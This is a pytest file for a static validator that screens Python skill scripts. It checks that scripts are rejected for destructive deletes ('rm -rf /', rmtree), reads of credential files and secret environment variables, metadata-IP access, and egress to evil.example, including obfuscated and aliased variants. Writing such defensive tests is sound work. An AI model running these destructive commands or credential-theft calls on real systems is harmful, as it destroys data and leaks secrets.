"""Phase-2 tests: static skill-script validator."""

from __future__ import annotations

from kiro_crew.skills_script_validator import validate_scripts, validate_skill_script


def test_clean_python_script_passes():
    ok, findings = validate_skill_script("run.py", "import json\nprint(json.dumps({'a': 1}))\n")
    assert ok is True
    assert findings == []


def test_rejects_non_python():
    ok, findings = validate_skill_script("run.sh", "echo hi\n")
    assert ok is False
    assert any("only Python" in f for f in findings)


def test_rejects_destructive():
    ok, findings = validate_skill_script("run.py", "import os\nos.system('rm -rf /tmp/x')\n")
    assert ok is False
    assert any("rm -rf" in f for f in findings)


def test_rejects_rmtree():
    ok, findings = validate_skill_script("run.py", "import shutil\nshutil.rmtree('/data')\n")
    assert ok is False
    assert any("rmtree" in f for f in findings)


def test_rejects_asyncio_egress():
    ok, findings = validate_skill_script(
        "run.py",
        "import asyncio\nasyncio.open_connection('evil.example', 443)\n",
    )
    assert ok is False
    assert any("open_connection" in f for f in findings)


def test_rejects_asyncio_egress_aliased():
    ok, findings = validate_skill_script(
        "run.py",
        "import asyncio as a\na.start_server(lambda r, w: None, '0.0.0.0', 80)\n",
    )
    assert ok is False
    assert any("start_server" in f for f in findings)


def test_benign_asyncio_control_flow_passes():
    ok, findings = validate_skill_script(
        "run.py",
        "import asyncio\n\nasync def main():\n    await asyncio.sleep(1)\n",
    )
    assert ok is True
    assert findings == []


def test_rejects_credential_access():
    ok, findings = validate_skill_script("run.py", "open('/home/u/.aws/credentials').read()\n")
    assert ok is False
    assert any("credential access" in f for f in findings)


def test_rejects_secret_env_getter():
    """os.getenv / os.environ.get on a secret-named var is rejected too, not just
    the os.environ["..."] subscript form."""
    for src in (
        "import os\nx = os.getenv('GITHUB_TOKEN')\n",
        "import os\nx = os.environ.get('API_SECRET')\n",
        "import os\nx = os.getenv('DB_PASSWORD')\n",
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False
        assert any("secret env var" in f for f in findings)


def test_rejects_metadata_ip():
    ok, findings = validate_skill_script("run.py", "x = '169.254.169.254'\n")
    assert ok is False
    assert any("metadata IP" in f for f in findings)


def test_flags_network_egress():
    ok, findings = validate_skill_script("run.py", "import requests\nrequests.get('http://x')\n")
    assert ok is False
    assert any("network egress" in f for f in findings)


def test_rejects_webbrowser_egress():
    """webbrowser.open(url) is a covert egress channel — banned like the HTTP
    clients so a secret can't ride out in a launched URL."""
    ok, findings = validate_skill_script(
        "run.py", "import webbrowser\nwebbrowser.open('https://evil.example/?x=' + s)\n"
    )
    assert ok is False
    assert any("network egress import" in f for f in findings)
    ok2, f2 = validate_skill_script(
        "run.py", "from webbrowser import open as o\no('https://evil.example/?x')\n"
    )
    assert ok2 is False
    assert any("network egress import-from" in f for f in f2)


def test_rejects_oversize():
    big = "x = 1\n" * 2000  # > 4096 bytes
    ok, findings = validate_skill_script("run.py", big)
    assert ok is False
    assert any("too large" in f for f in findings)


def test_rejects_syntax_error():
    ok, findings = validate_skill_script("run.py", "def broken(:\n")
    assert ok is False
    assert any("syntax error" in f for f in findings)


def test_validate_scripts_aggregate():
    ok, report = validate_scripts(
        [
            {"filename": "good.py", "content": "print(1)\n"},
            {"filename": "bad.py", "content": "import os\nos.system('rm -rf /')\n"},
        ]
    )
    assert ok is False
    assert "bad.py" in report and "good.py" not in report

    ok2, report2 = validate_scripts([{"filename": "ok.py", "content": "print(1)\n"}])
    assert ok2 is True and report2 == {}


def test_ast_rejects_dynamic_import_remove():
    # The exact obfuscated payload a regex denylist misses.
    ok, findings = validate_skill_script("run.py", "__import__('os').remove('/tmp/x')\n")
    assert ok is False
    assert any("dynamic exec/import" in f for f in findings)
    assert any(".remove()" in f for f in findings)


def test_ast_rejects_eval_exec():
    ok, f1 = validate_skill_script("run.py", "eval('1+1')\n")
    assert ok is False and any("eval" in x for x in f1)
    ok2, f2 = validate_skill_script("run.py", "exec('x=1')\n")
    assert ok2 is False and any("exec" in x for x in f2)


def test_ast_rejects_dangerous_imports_and_calls():
    ok, f = validate_skill_script("run.py", "import subprocess\nsubprocess.run(['ls'])\n")
    assert ok is False
    assert any("dangerous import" in x for x in f)
    ok2, f2 = validate_skill_script("run.py", "from pathlib import Path\nPath('/x').unlink()\n")
    assert ok2 is False and any(".unlink()" in x for x in f2)


def test_ast_allows_benign_python():
    ok, findings = validate_skill_script(
        "run.py", "import json\nd = {'a': 1}\nprint(json.dumps(d))\n"
    )
    assert ok is True and findings == []


def test_rejects_aliased_network_import():
    ok, findings = validate_skill_script(
        "run.py", "import requests as r\nr.get('http://evil.example/x')\n"
    )
    assert ok is False
    assert any("network egress import" in f for f in findings)


def test_rejects_network_import_from_and_socket_alias():
    ok1, f1 = validate_skill_script("a.py", "from urllib import request\nrequest.urlopen('http://x')\n")
    assert ok1 is False and any("network egress import-from" in f for f in f1)
    ok2, f2 = validate_skill_script("b.py", "import socket as s\ns.socket()\n")
    assert ok2 is False and any("network egress import" in f for f in f2)


def test_rejects_from_import_dangerous_name():
    ok, findings = validate_skill_script("run.py", "from os import remove\nremove('/tmp/x')\n")
    assert ok is False
    assert any("dangerous import-from: os.remove" in f for f in findings)
    ok2, f2 = validate_skill_script("b.py", "from shutil import rmtree as rt\nrt('/x')\n")
    assert ok2 is False and any("rmtree" in f for f in f2)


def test_rejects_expanded_sensitive_paths():
    """The sensitive-path set is now the canonical security list, not a partial
    regex (GPT HIGH): .gnupg/.npmrc/.pypirc/.docker/config.json + governance
    trust-root files must all be rejected."""
    for path in (
        "~/.gnupg/secring.gpg",
        "~/.npmrc",
        "~/.pypirc",
        "~/.docker/config.json",
        "/home/u/.kiro/crew/security_policy.json",
    ):
        ok, findings = validate_skill_script("run.py", f"open('{path}').read()\n")
        assert ok is False and any("sensitive path" in f for f in findings), path


def test_env_environ_not_flagged_as_sensitive_path():
    """The .env path token must not false-positive on os.environ access."""
    ok, findings = validate_skill_script("run.py", "import os\nprint(os.environ.get('HOME'))\n")
    assert ok is True, findings


def test_rejects_aliased_dangerous_attribute():
    """A dangerous callable referenced (not called) off a dangerous module —
    `f = os.remove; f(x)` — must be rejected (GPT MEDIUM: indirect attr)."""
    ok, findings = validate_skill_script(
        "run.py", "import os\nf = os.remove\nf('/tmp/x')\n"
    )
    assert ok is False
    assert any("dangerous attribute" in f or "dangerous call" in f for f in findings)


def test_rejects_aliased_module_dangerous_attribute():
    """`import os as x; f = x.remove` must be rejected via alias resolution."""
    ok, findings = validate_skill_script("run.py", "import os as x\nf = x.remove\nf('/tmp/y')\n")
    assert ok is False
    assert any("dangerous attribute" in f for f in findings)


def test_rejects_getattr_on_dangerous_module():
    """`getattr(os, 'remove')` dynamic access must be rejected."""
    ok, findings = validate_skill_script("run.py", "import os\ngetattr(os, 'remove')('/tmp/y')\n")
    assert ok is False
    assert any("getattr" in f for f in findings)
